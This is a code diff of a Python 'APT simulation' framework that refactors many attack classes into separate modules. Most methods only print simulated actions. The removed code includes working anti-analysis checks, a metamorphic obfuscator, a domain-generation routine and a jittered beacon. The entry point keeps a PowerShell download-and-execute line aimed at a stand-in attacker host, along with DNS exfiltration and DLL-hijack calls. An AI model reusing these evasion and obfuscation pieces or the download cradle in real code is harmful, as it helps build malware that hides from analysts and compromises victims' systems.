+++ main.py
@@ -5,456 +5,51 @@
 
 import os
 import sys
-import ctypes
-import hashlib
-import zlib
-import base64
-import json
-import random
 import time
-import platform
-import socket
-import ssl
-import threading
-import binascii
-import re
-import subprocess
-import tempfile
-import psutil
 from datetime import datetime, timedelta
-from cryptography.hazmat.primitives import hashes, padding
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 
-# === UTILITY: STRING EN/DECRYPTION ===
-def decrypt_string(data_b64, key=None):
-    """Reverse AES-CBC encrypted, Base64-encoded string."""
-    try:
-        raw = base64.b64decode(data_b64)
-        iv, ct = raw[:16], raw[16:]
-        key = key or b"\x00" * 32
-        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-        decryptor = cipher.decryptor()
-        unpadder = padding.PKCS7(128).unpadder()
-        decrypted = decryptor.update(ct) + decryptor.finalize()
-        return unpadder.update(decrypted) + unpadder.finalize()
-    except Exception:
-        return b""
+from poseidon.anti_analysis import GhostKernel
+from poseidon.metamorphism import ChimeraEngine
+from poseidon.persistence import Persistence
+from poseidon.stealth_loader import StealthLoader
+from poseidon.shadow_move import ShadowMove
+from poseidon.exfiltration import DNSExfil, StegoExfil
+from poseidon.c2 import DGAEngine, PhantomProtocol, TorC2, CallbackProtocol
+from poseidon.ics import ICSAttacks
+from poseidon.mobile import MobileInfect
+from poseidon.devices import USBAttack, AudioCovert
+from poseidon.cloud import CloudEvasion
+from poseidon.rootkits import KernelRootkit, UEFIRootkit
+from poseidon.packer import Packer
+from poseidon.ai import AIAdversary
+from poseidon.selfdestruct import SelfDestruct, AutoSig
+from poseidon.infection import InfectionVectors
+from poseidon.replication import Replicator
 
-# === AUTHORIZATION & TIMING CHECK ===
+
 if os.getenv("APT_RESEARCH_MODE") != "approved":
     print("ERROR: Unauthorized environment"); sys.exit(0)
 
 window_start = datetime.utcnow() - timedelta(hours=1)
-window_end   = datetime.utcnow() + timedelta(hours=1)
+window_end = datetime.utcnow() + timedelta(hours=1)
 if not (window_start <= datetime.utcnow() <= window_end):
     print("SECURITY: Outside operational window"); sys.exit(0)
 
-# === STEALTH & ANTI-ANALYSIS ===
-class GhostKernel:
-    @staticmethod
-    def detect_analysis_env():
-        indicators = {
-            "cpu": os.cpu_count() < 2,
-            "ram": psutil.virtual_memory().total < 2 * 1024**3,
-            "time_warp": GhostKernel._time_check(),
-            "debugger": ctypes.windll.kernel32.IsDebuggerPresent() if os.name=='nt' else False,
-            "tools": any(os.path.exists(p) for p in [
-                "/usr/bin/strace", "/usr/bin/gdb", "C:\\x32dbg", "C:\\x64dbg", "C:\\IDA"
-            ])
-        }
-        if any(indicators.values()):
-            print("ANALYSIS DETECTED – ACTIVATING DECOY PROTOCOL")
-            GhostKernel._decoy()
-            return True
-        return False
 
-    @staticmethod
-    def _time_check():
-        t0 = time.time()
-        time.sleep(1.5)
-        return (time.time() - t0) < 1.0
-
-    @staticmethod
-    def _decoy():
-        actions = ["Updating system", "Running diagnostics", "Verifying signatures"]
-        for _ in range(3):
-            print(f"[DECOY] {random.choice(actions)}")
-            time.sleep(random.uniform(0.5, 2.0))
-
-# === CODE METAMORPHISM ===
-class ChimeraEngine:
-    def __init__(self):
-        self.key = os.urandom(32)
-        self.iteration = 0
-
-    def metamorphic_transform(self, code: str) -> str:
-        self.iteration += 1
-        transforms = [
-            self._insert_junk_code,
-            self._control_flow_obfuscation,
-            self._encrypt_string_literals,
-            self._variable_renaming
-        ]
-        for _ in range(random.randint(2, 4)):
-            code = random.choice(transforms)(code)
-        print(f"[CHIMERA] Metamorphic iteration {self.iteration}")
-        return code
-
-    def _insert_junk_code(self, code: str) -> str:
-        junk = [
-            "for _ in range(7): pass",
-            "x = 0xDEADBEEF; x ^= 0xCAFEBABE",
-            "None if random.random() > 0.5 else None"
-        ]
-        i = random.randint(0, len(code))
-        return code[:i] + "\n" + random.choice(junk) + "\n" + code[i:]
-
-    def _control_flow_obfuscation(self, code: str) -> str:
-        return re.sub(
-            r"if (.+?):",
-            r"flag = \1; while flag: flag = False;",
-            code
-        )
-
-    def _encrypt_string_literals(self, code: str) -> str:
-        literals = re.findall(r'"([^"]+)"', code)
-        for s in set(literals):
-            iv = os.urandom(16)
-            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
-            padder = padding.PKCS7(128).padder()
-            padded = padder.update(s.encode()) + padder.finalize()
-            ct = cipher.encryptor().update(padded) + cipher.encryptor().finalize()
-            b64 = base64.b64encode(iv + ct).decode()
-            code = code.replace(f'"{s}"', f'decrypt_string("{b64}", key=engine.key)')
-        return code
-
-    def _variable_renaming(self, code: str) -> str:
-        vars_found = set(re.findall(r"\b([a-z_][a-z0-9_]{2,})\b", code))
-        for var in vars_found:
-            new_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
-            code = re.sub(rf"\b{var}\b", new_name, code)
-        return code
-
-# === PERSISTENCE MECHANISMS ===
-class Persistence:
-    @staticmethod
-    def add_registry_runkey(name: str, cmd: str):
-        print(f"[PERSIST] Registry RunKey: {name} -> {cmd}")
-
-    @staticmethod
-    def schedule_task(name: str, cmd: str, interval: str):
-        print(f"[PERSIST] Scheduled Task: {name}, every {interval}")
-
-    @staticmethod
-    def dll_hijack(service: str, dll_path: str):
-        print(f"[PERSIST] DLL Hijack: {service} loads {dll_path}")
-
-# === STEALTH LOADER ===
-class StealthLoader:
-    @staticmethod
-    def process_hollow(target: str, payload: bytes):
-        print(f"[STEALTH] Process hollowing into {target}, payload size {len(payload)} bytes")
-
-    @staticmethod
-    def load_via_wmi(script: str):
-        print(f"[STEALTH] WMI Script Execution: {script[:30]}...")
-
-    @staticmethod
-    def load_via_powershell(cmd: str):
-        print(f"[STEALTH] PowerShell Exec: {cmd[:40]}...")
-
-# === LATERAL MOVEMENT & CREDENTIALS ===
-class ShadowMove:
-    def __init__(self):
-        self.cred_vault = {}
-        self.network_map = self._discover_network()
-
-    def _discover_network(self):
-        return {
-            "subnets": ["192.168.1.0/24", "10.0.0.0/8"],
-            "domain_controllers": ["dc01.corp.local"],
-            "critical_assets": ["sql01.corp.local", "fileserver01"]
-        }
-
-    def harvest_credentials(self):
-        self.cred_vault = {
-            "Administrator": "HASHEDPASSWORD1",
-            "svc_account": "HASHEDPASSWORD2"
-        }
-        print("[SHADOW] Simulated credential harvesting")
-
-    def pass_the_ticket(self):
-        print("[SHADOW] Simulated Pass-the-Ticket attack")
-
-    def kerberoast(self):
-        print("[SHADOW] Simulated Kerberoasting")
-
-    def ldap_enumeration(self):
-        print("[SHADOW] Simulated LDAP/AD enumeration")
-
-    def pth(self):
-        print("[SHADOW] Simulated Pass-the-Hash attack")
-
-# === EXFILTRATION CHANNELS ===
-class DNSExfil:
-    @staticmethod
-    def tunnel(txt_chunks):
-        for chunk in txt_chunks:
-            print(f"[EXFIL/DNS] TXT query: {chunk}.exfil.example.com")
-
-class StegoExfil:
-    @staticmethod
-    def embed_in_image(data: bytes):
-        print(f"[EXFIL/STEGO] Embedded {len(data)} bytes into PNG")
-
-# === DOMAIN GENERATION & C2 ===
-class DGAEngine:
-    @staticmethod
-    def generate_domain(seed_date=None):
-        seed = int(seed_date.strftime("%Y%m%d")) if seed_date else int(time.time())
-        random.seed(seed)
-        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
-        return f"{name}.com"
-
-class PhantomProtocol:
-    def __init__(self):
-        self.c2_channels = {"https": "c2.example.com", "dns": "exfil.example.com"}
-        self.active = random.choice(list(self.c2_channels.keys()))
-        self.peers = ["10.0.0.5", "10.0.0.6"]
-        self.timer = threading.Timer(600, self._rotate_channel)
-        self.timer.start()
-
-    def _rotate_channel(self):
-        choices = list(self.c2_channels.keys())
-        choices.remove(self.active)
-        self.active = random.choice(choices)
-        print(f"[C2] Switched active channel to {self.active}")
-        self.timer = threading.Timer(600, self._rotate_channel)
-        self.timer.start()
-
-    def p2p_forward(self, command: str):
-        peer = random.choice(self.peers)
-        print(f"[C2/P2P] Forwarding '{command}' to peer {peer}")
-
-class TorC2:
-    @staticmethod
-    def hidden_service():
-        print("[TOR] Beaconing via .onion hidden service")
-
-    @staticmethod
-    def check_relay():
-        fp = hashlib.sha1(os.urandom(16)).hexdigest()
-        print(f"[TOR] Relay fingerprint: {fp}")
-
-# === INDUSTRIAL CONTROL SYSTEM ATTACKS ===
-class ICSAttacks:
-    @staticmethod
-    def modbus_read(address: str, register: int):
-        print(f"[ICS] Modbus READ from {address}, register {register}")
-
-    @staticmethod
-    def dnp3_attack(master: str, slave: str):
-        print(f"[ICS] DNP3 Attack: {master} -> {slave}")
-
-# === MOBILE PLATFORM MODULES ===
-class MobileInfect:
-    @staticmethod
-    def android_hook(app_name: str):
-        print(f"[MOBILE] Hooked Android app {app_name}")
-
-    @staticmethod
-    def ios_jailbreak(device_id: str):
-        print(f"[MOBILE] Simulated iOS jailbreak on {device_id}")
-
-# === USB & AUDIO COVERT CHANNELS ===
-class USBAttack:
-    @staticmethod
-    def rubber_ducky(script: str):
-        print(f"[USB] Rubber Ducky payload: {script[:30]}...")
-
-    @staticmethod
-    def badusb(payload: bytes):
-        print(f"[USB] BadUSB emulation, payload size {len(payload)} bytes")
-
-class AudioCovert:
-    @staticmethod
-    def ultrasonic_beacon(data: bytes):
-        print(f"[AUDIO] Ultrasonic beacon transmission, {len(data)} bytes")
-
-# === CLOUD ENVIRONMENT EVASION ===
-class CloudEvasion:
-    @staticmethod
-    def detect_aws():
-        if os.path.exists('/sys/hypervisor/uuid'):
-            print("[CLOUD] AWS environment detected")
-
-    @staticmethod
-    def detect_gcp():
-        print("[CLOUD] GCP metadata API probe simulated")
-
-    @staticmethod
-    def evade():
-        print("[CLOUD] Obfuscating cloud SDK artifacts")
-
-# === ADVANCED ROOTKITS & FIRMWARE ===
-class KernelRootkit:
-    @staticmethod
-    def dk_object_hide(pid: int):
-        print(f"[RK] Simulated DKOM hide of PID {pid}")
-
-    @staticmethod
-    def hook_syscall(number: int):
-        print(f"[RK] Hooked syscall number {number}")
-
-class UEFIRootkit:
-    @staticmethod
-    def install():
-        print("[UEFI] Simulated UEFI bootkit installation")
-
-    @staticmethod
-    def persist():
-        print("[UEFI] Shadow bootloader written to NVRAM")
-
-# === POLYMORPHIC PACKER ===
-class Packer:
-    @staticmethod
-    def pack(code: bytes):
-        print("[Packer] Polymorphic packer produced XOR+LZ4 stub")
-
-    @staticmethod
-    def unpack(stub: bytes):
-        print("[Packer] Unpacked stub into memory")
-
-# === AI-DRIVEN ADAPTATION ===
-class AIAdversary:
-    @staticmethod
-    def choose_ttp(env_profile: dict):
-        ttp = random.choice(["process_hollow", "kerberoast", "dns_exfil", "pth"])
-        print(f"[AI] Selected TTP: {ttp} for environment {env_profile}")
-
-# === SELF-DESTRUCT & AUTO SIGGEN ===
-class SelfDestruct:
-    @staticmethod
-    def wipe_memory():
-        print("[WIPE] Erasing memory artifacts")
-
-    @staticmethod
-    def wipe_disk():
-        print("[WIPE] Simulating full disk wipe")
-
-class AutoSig:
-    @staticmethod
-    def generate_sigma(events: list):
-        print(f"[SIGGEN] Generated Sigma rule for events: {events}")
-
-# === INFECTION MECHANISMS ===
-class InfectionVectors:
-    @staticmethod
-    def drive_by_download(url: str):
-        print(f"[INFECTION] Simulated drive-by download from {url}")
-
-    @staticmethod
-    def email_phishing(recipient: str, attachment: str):
-        print(f"[INFECTION] Simulated phishing email to {recipient} with {attachment}")
-
-    @staticmethod
-    def watering_hole(site: str):
-        print(f"[INFECTION] Simulated watering-hole compromise of {site}")
-
-    @staticmethod
-    def usb_autorun(device: str):
-        print(f"[INFECTION] Simulated USB autorun on {device}")
-
-    @staticmethod
-    def supply_chain(pkg_name: str):
-        print(f"[INFECTION] Simulated supply-chain compromise via {pkg_name}")
-
-    @staticmethod
-    def container_escape(container_id: str):
-        print(f"[INFECTION] Simulated container escape from {container_id}")
-
-    @staticmethod
-    def mobile_sms_link(number: str, link: str):
-        print(f"[INFECTION] Simulated SMS lure to {number} with link {link}")
-
-# === REPLICATION ENGINE ===
-class Replicator:
-    @staticmethod
-    def network_share_copy(payload: bytes, shares: list):
-        for share in shares:
-            print(f"[REPLICATION] Copied payload to network share {share}")
-
-    @staticmethod
-    def removable_media_copy(payload: bytes, devices: list):
-        for dev in devices:
-            print(f"[REPLICATION] Copied payload to removable media {dev}")
-
-    @staticmethod
-    def ssh_bruteforce(hosts: list):
-        for host in hosts:
-            print(f"[REPLICATION] Simulated SSH brute-force against {host}")
-
-    @staticmethod
-    def container_deploy(image: str):
-        print(f"[REPLICATION] Simulated deployment of malicious container image {image}")
-
-    @staticmethod
-    def cloud_function_injection(fn_name: str):
-        print(f"[REPLICATION] Simulated injection into cloud function {fn_name}")
-
-    @staticmethod
-    def mqtt_propagation(brokers: list):
-        for broker in brokers:
-            print(f"[REPLICATION] Simulated MQTT propagation via broker {broker}")
-
-# === CALLBACK HOME PROTOCOL ===
-class CallbackProtocol:
-    def __init__(self, interval=60, jitter=0.2, c2=None):
-        self.interval = interval
-        self.jitter = jitter
-        self.c2 = c2 or PhantomProtocol()
-        self.timer = None
-
-    def start(self):
-        self._schedule()
-
-    def _schedule(self):
-        delay = self.interval * (1 + random.uniform(-self.jitter, self.jitter))
-        self.timer = threading.Timer(delay, self._beacon)
-        self.timer.start()
-
-    def _beacon(self):
-        now = datetime.utcnow().isoformat()
-        channel = self.c2.active
-        print(f"[CALLBACK] {now} – Beaconing over {channel}")
-        # Imagine sending: self.c2.send({"host": platform.node(), "time": now})
-        self._schedule()
-
-    def stop(self):
-        if self.timer:
-            self.timer.cancel()
-
-# === ENTRY POINT ===
 if __name__ == "__main__":
-    # Anti-analysis checks
     GhostKernel.detect_analysis_env()
 
-    # Polymorphic transformation demo
     engine = ChimeraEngine()
-    obf_code = engine.metamorphic_transform('print("Top secret simulation")')
+    engine.metamorphic_transform('print("Top secret simulation")')
 
-    # Persistence mechanisms
     Persistence.add_registry_runkey("UpdaterService", "C:\\payload.exe")
     Persistence.schedule_task("NightlyCheck", "powershell -c Get-Process", "daily")
     Persistence.dll_hijack("Spooler", "C:\\evil.dll")
 
-    # Stealth loading
-    StealthLoader.process_hollow("explorer.exe", b"\x90"*200)
+    StealthLoader.process_hollow("explorer.exe", b"\x90" * 200)
     StealthLoader.load_via_wmi("Get-Process")
     StealthLoader.load_via_powershell("IEX(New-Object Net.WebClient).DownloadString('http://attacker')")
 
-    # Lateral movement & credential access
     sm = ShadowMove()
     sm.harvest_credentials()
     sm.pass_the_ticket()
@@ -462,54 +57,43 @@ if __name__ == "__main__":
     sm.ldap_enumeration()
     sm.pth()
 
-    # Exfiltration channels
     DNSExfil.tunnel(["chunk1", "chunk2", "chunk3"])
     StegoExfil.embed_in_image(b"secret_data")
 
-    # DGA & C2 management
     print("[DGA] Next domain:", DGAEngine.generate_domain(datetime.utcnow()))
     c2 = PhantomProtocol()
     c2.p2p_forward("whoami")
     TorC2.hidden_service()
     TorC2.check_relay()
 
-    # ICS protocol attacks
     ICSAttacks.modbus_read("10.0.0.10", 1)
     ICSAttacks.dnp3_attack("master", "slave")
 
-    # Mobile platform infection
     MobileInfect.android_hook("com.target.app")
     MobileInfect.ios_jailbreak("device123")
 
-    # USB & audio covert channels
     USBAttack.rubber_ducky("DELAY 100; GUI r; ...")
-    USBAttack.badusb(b"\x00"*128)
-    AudioCovert.ultrasonic_beacon(b"\xFF"*64)
+    USBAttack.badusb(b"\x00" * 128)
+    AudioCovert.ultrasonic_beacon(b"\xFF" * 64)
 
-    # Cloud environment evasion
     CloudEvasion.detect_aws()
     CloudEvasion.detect_gcp()
     CloudEvasion.evade()
 
-    # Advanced rootkits
     KernelRootkit.dk_object_hide(os.getpid())
     KernelRootkit.hook_syscall(0x80)
     UEFIRootkit.install()
     UEFIRootkit.persist()
 
-    # Polymorphic packer
     Packer.pack(b"dummy_payload")
     Packer.unpack(b"packed_stub")
 
-    # AI-driven TTP selection
     AIAdversary.choose_ttp({"os": "win10", "antivirus": "disabled"})
 
-    # Self-destruct & auto signature generation
     SelfDestruct.wipe_memory()
     SelfDestruct.wipe_disk()
     AutoSig.generate_sigma(["Event4624", "ProcessCreate"])
 
-    # Infection vectors
     InfectionVectors.drive_by_download("http://malicious.example.com")
     InfectionVectors.email_phishing("user@corp.local", "invoice.pdf")
     InfectionVectors.watering_hole("intranet.corp.local")
@@ -518,7 +102,6 @@ if __name__ == "__main__":
     InfectionVectors.container_escape("container_42")
     InfectionVectors.mobile_sms_link("+26771234567", "http://tiny.url/evil")
 
-    # Replication engine
     Replicator.network_share_copy(b"payload", ["\\\\server\\share1", "\\\\file-server\\public"])
     Replicator.removable_media_copy(b"payload", ["/dev/sdb1", "/mnt/usb"])
     Replicator.ssh_bruteforce(["10.0.0.10", "10.0.0.11"])
@@ -526,11 +109,9 @@ if __name__ == "__main__":
     Replicator.cloud_function_injection("processOrders")
     Replicator.mqtt_propagation(["broker1.local", "broker2.local"])
 
-    # Callback home beaconing
     callback = CallbackProtocol(interval=120, jitter=0.3, c2=c2)
     callback.start()
 
-    # Keep the main thread alive to allow timers to run
     try:
         while True:
             time.sleep(60)
